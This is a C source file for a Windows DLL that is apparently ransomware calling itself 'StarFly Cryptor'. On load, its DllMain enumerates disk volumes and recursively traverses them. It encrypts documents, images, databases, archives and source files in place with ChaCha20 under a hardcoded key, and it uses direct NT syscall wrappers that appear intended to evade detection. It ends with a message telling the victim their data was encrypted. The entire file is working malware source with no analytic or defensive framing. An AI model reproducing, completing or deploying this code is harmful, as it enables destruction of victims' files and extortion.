#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "starfly.h"
#include "nt.h"
extern void StarFlyCoreStart();
int CurrentTravDrive = 0;
typedef struct _FILE_DIRECTORY_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    _Field_size_bytes_(FileNameLength) WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, * PFILE_DIRECTORY_INFORMATION;

typedef struct {
    unsigned int state[16];
} chacha20_ctx;

static inline unsigned int ROTL(unsigned int x, int n) {
    return (x << n) | (x >> (32 - n));
}

static void chacha20_quarter_round(unsigned int* a, unsigned int* b, unsigned int* c, unsigned int* d) {
    *a += *b; *d ^= *a; *d = ROTL(*d, 16);
    *c += *d; *b ^= *c; *b = ROTL(*b, 12);
    *a += *b; *d ^= *a; *d = ROTL(*d, 8);
    *c += *d; *b ^= *c; *b = ROTL(*b, 7);
}

void chacha20_init(chacha20_ctx* ctx, const unsigned char* key, const unsigned char* nonce) {
    ctx->state[0] = 0x61707865;
    ctx->state[1] = 0x3320646e;
    ctx->state[2] = 0x79622d32;
    ctx->state[3] = 0x6b206536;

    for (int i = 0; i < 8; i++) {
        ctx->state[4 + i] = ((unsigned int)key[i * 4 + 0] << 0) |
            ((unsigned int)key[i * 4 + 1] << 8) |
            ((unsigned int)key[i * 4 + 2] << 16) |
            ((unsigned int)key[i * 4 + 3] << 24);
    }

    ctx->state[12] = 0;
    ctx->state[13] = 0;
    ctx->state[14] = ((unsigned int)nonce[0] << 0) |
        ((unsigned int)nonce[1] << 8) |
        ((unsigned int)nonce[2] << 16) |
        ((unsigned int)nonce[3] << 24);
    ctx->state[15] = ((unsigned int)nonce[4] << 0) |
        ((unsigned int)nonce[5] << 8) |
        ((unsigned int)nonce[6] << 16) |
        ((unsigned int)nonce[7] << 24);
}

void chacha20_block(chacha20_ctx* ctx, unsigned char* output) {
    unsigned int x[16];
    memcpy(x, ctx->state, sizeof(unsigned int) * 16);

    for (int i = 0; i < 10; i++) {
        chacha20_quarter_round(&x[0], &x[4], &x[8], &x[12]);
        chacha20_quarter_round(&x[1], &x[5], &x[9], &x[13]);
        chacha20_quarter_round(&x[2], &x[6], &x[10], &x[14]);
        chacha20_quarter_round(&x[3], &x[7], &x[11], &x[15]);

        chacha20_quarter_round(&x[0], &x[5], &x[10], &x[15]);
        chacha20_quarter_round(&x[1], &x[6], &x[11], &x[12]);
        chacha20_quarter_round(&x[2], &x[7], &x[8], &x[13]);
        chacha20_quarter_round(&x[3], &x[4], &x[9], &x[14]);
    }

    for (int i = 0; i < 16; i++) {
        unsigned int result = x[i] + ctx->state[i];
        output[i * 4 + 0] = (result >> 0) & 0xFF;
        output[i * 4 + 1] = (result >> 8) & 0xFF;
        output[i * 4 + 2] = (result >> 16) & 0xFF;
        output[i * 4 + 3] = (result >> 24) & 0xFF;
    }

    ctx->state[12]++;
    if (ctx->state[12] == 0) {
        ctx->state[13]++;
    }
}

void chacha20_crypt(chacha20_ctx* ctx, unsigned char* data, size_t data_len) {
    unsigned char keystream[64];
    size_t i = 0;
    while (i < data_len) {
        chacha20_block(ctx, keystream);
        size_t block_len = (data_len - i) > 64 ? 64 : (data_len - i);
        for (size_t j = 0; j < block_len; j++) {
            data[i + j] ^= keystream[j];
        }
        i += block_len;
    }
}

void SFEncryptFile(const WCHAR* filePath) {
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uniStr;
    
    WCHAR tempPath[1024];
    DWORD tempPathLen = 0;
    for (DWORD i = 0; filePath[i] != L'\0'; ++i) {
        if (filePath[i] == L'\\' && (i > 0 && filePath[i-1] == L'\\')) {
            continue;
        }
        tempPath[tempPathLen++] = filePath[i];
    }
    tempPath[tempPathLen] = L'\0';
    RtlInitUnicodeString(&uniStr, tempPath);
    InitializeObjectAttributes(&objAttr, &uniStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK ioStatusBlock;
    HANDLE hFile = 0;
    NTSTATUS status = SFNtCreateFile(
        &hFile,
        FILE_GENERIC_READ | FILE_GENERIC_WRITE,
        &objAttr,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );
    if (hFile == 0) {
        return;
    }

    FILE_STANDARD_INFORMATION fileInfo;
    status = SFNtQueryInformationFile(hFile, &ioStatusBlock, &fileInfo, sizeof(fileInfo), FileStandardInformation);
    if (fileInfo.EndOfFile.LowPart == 0) {
        SFNtClose(hFile);
        return;
    }

    ULONG bufferSize = fileInfo.EndOfFile.LowPart;
    if (fileInfo.EndOfFile.HighPart != 0 || bufferSize == 0) {
        SFNtClose(hFile);
        return;
    }

    unsigned char* buffer = (unsigned char*)malloc(bufferSize);
    if (buffer == NULL) {
        SFNtClose(hFile);
        return;
    }

    ULONG bytesRead = 0;
    LARGE_INTEGER byteOffset;
    byteOffset.QuadPart = 0;

    status = SFNtReadFile(hFile, NULL, NULL, NULL, &ioStatusBlock, buffer, bufferSize, &byteOffset, NULL);
    if (ioStatusBlock.Information == 0) {
        free(buffer);
        SFNtClose(hFile);
        return;
    }
    bytesRead = ioStatusBlock.Information;
    byteOffset.QuadPart = 0;

    unsigned char key[32] = { 0x20, 0x06, 0x02, 0x25, 0x4a, 0x69, 0x75, 0x59, 0x61, 0x6e, 0x20, 0x47, 0x69, 0x74, 0x48, 0x75,
                             0x62, 0x43, 0x4e, 0x4d, 0x72, 0x53, 0x75, 0x6e, 0x73, 0x68, 0x69, 0x6e, 0x65, 0x51, 0x41, 0x51 };
    unsigned char nonce[8] = { 0x59, 0x65, 0x50, 0x69, 0x61, 0x6e, 0x58, 0x44 };
    chacha20_ctx ctx;
    chacha20_init(&ctx, key, nonce);
    chacha20_crypt(&ctx, buffer, bytesRead);

    status = SFNtWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, buffer, bytesRead, &byteOffset, NULL);
    free(buffer);
    SFNtClose(hFile);
    return;
}

HANDLE dirHandle;
void TraverseDirectory(const WCHAR* directoryPath) {
    HANDLE currentDirHandle = 0;
    FILE_DIRECTORY_INFORMATION* dirInfo;
    ULONG context = 0;
    ULONG returnLength;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uniStr;
    RtlInitUnicodeString(&uniStr, directoryPath);
    InitializeObjectAttributes(&objAttr, &uniStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS status = SFNtCreateFile(
        &currentDirHandle,
        FILE_GENERIC_READ,
        &objAttr,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );
    if (currentDirHandle == 0) {
        return;
    }
    HANDLE originalDirHandle = dirHandle;
    dirHandle = currentDirHandle;
    while (TRUE) {
        IO_STATUS_BLOCK ioStatusBlock;
        ULONG bufferSize = 1024 * 1024;
        BYTE* buffer = (BYTE*)malloc(bufferSize);
        status = SFNtQueryDirectoryFileEx(
            dirHandle,
            NULL,
            NULL,
            NULL,
            &ioStatusBlock,
            buffer,
            bufferSize,
            FileDirectoryInformation,
            0,
            NULL
        );
        dirInfo = (FILE_DIRECTORY_INFORMATION*)buffer;
        if (ioStatusBlock.Information == 0 || dirInfo->NextEntryOffset == 0xcdcdcdcd) {
            if (buffer) {
                free(buffer);
            }
            break;
        }
        while (TRUE) {
            WCHAR filePath[1024];
            WCHAR fileName[1024];
            DWORD fileNameLen = dirInfo->FileNameLength / sizeof(WCHAR);
            if (fileNameLen >= 1024) {
            }
            else {
                wcsncpy_s(fileName, 1024, dirInfo->FileName, fileNameLen);
                for (int i = fileNameLen + 1; i < 1024; i++) {
                    fileName[i] = L'\0';
                }
                swprintf_s(filePath, 1024, L"%s\\%s", directoryPath, fileName);
                if (IsTargetFile(fileName)) {
                    SFEncryptFile(filePath);
                }
                // 检查是否为目录，如果是，则递归调用
                if (dirInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    if (wcscmp(fileName, L".") != 0 && wcscmp(fileName, L"..") != 0) {
                        TraverseDirectory(filePath);
                    }
                }
            }
            if (dirInfo->NextEntryOffset == 0) {
                break;
            }
            dirInfo = (FILE_DIRECTORY_INFORMATION*)((BYTE*)dirInfo + dirInfo->NextEntryOffset);
        }
        if (buffer) {
            free(buffer);
        }
    }
    SFNtClose(dirHandle);
    dirHandle = originalDirHandle;
    return;
}

BOOL IsTargetFile(const WCHAR* fileName) {
    size_t len = wcslen(fileName);
    if (len < 5) {
        return FALSE;
    }
    const WCHAR* extensions[] = {
        L".txt", L".doc", L".xls", L".ppt", L".pdf", L".jpg", L".png", L".bmp", L".gif",
        L".mp4", L".mp3", L".sql", L".db", L".zip", L".rar", L".7z", L".html", L".c", L".h", L".py"
    };
    int numExtensions = sizeof(extensions) / sizeof(extensions[0]);
    BOOL isTarget = FALSE;
    for (int i = 0; i < numExtensions; i++) {
        size_t extLen = wcslen(extensions[i]);
        if (len >= extLen && _wcsicmp(fileName + len - extLen, extensions[i]) == 0) {
            isTarget = TRUE;
            break;
        }
    }
    return isTarget;
}
BOOL o_logicalDrives[26] = { FALSE };
DWORD o_targetDrives = 0;
int CurrentDrive = 1;
HANDLE drihFile;
void EnumLogicalDrives() {
    CurrentDrive = 1;
    while (CurrentDrive <= 26) {
        WCHAR currentDriveLetter[26];
        swprintf_s(currentDriveLetter, 26, L"\\Device\\HarddiskVolume%d\\", CurrentDrive);
        UNICODE_STRING uniStr;
        OBJECT_ATTRIBUTES objAttr;
        IO_STATUS_BLOCK ioStatusBlock;
        RtlInitUnicodeString(&uniStr, currentDriveLetter);
        InitializeObjectAttributes(&objAttr, &uniStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
        drihFile = 0;
        NTSTATUS status = SFNtCreateFile(
            &drihFile, // HANDLE hFile
            FILE_GENERIC_READ, // Desired Access
            &objAttr, // PObjAttr
            &ioStatusBlock, // PIO_STATUS_BLOCK
            NULL, // AllocSize Opt
            FILE_ATTRIBUTE_NORMAL, // FileAttr
            FILE_SHARE_READ | FILE_SHARE_WRITE, // ShareAccess
            FILE_OPEN, // Create Disposition
            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, // File create/open option flags
            NULL, // EaBuffer
            0 // EaLength 
        );
        if (drihFile != 0) {
            o_logicalDrives[CurrentDrive - 1] = TRUE;
            o_targetDrives++;
            SFNtClose(drihFile);
        }
        else {
            o_logicalDrives[CurrentDrive - 1] = FALSE;
        }
        CurrentDrive++;
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        StarFlyCoreStart();
        EnumLogicalDrives();
        for (int i = 0; i < 10; i++) {
            if (o_logicalDrives[i]) {
                WCHAR drivePath[25];
                CurrentTravDrive = i + 1;
                swprintf_s(drivePath, 25, L"\\Device\\HarddiskVolume%d\\", i + 1);
                TraverseDirectory(drivePath);
            }
        }
        MessageBoxW(NULL, L"Your Data Was Encrypted By StarFly Cryptor.", L"Attention!", MB_ICONWARNING);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}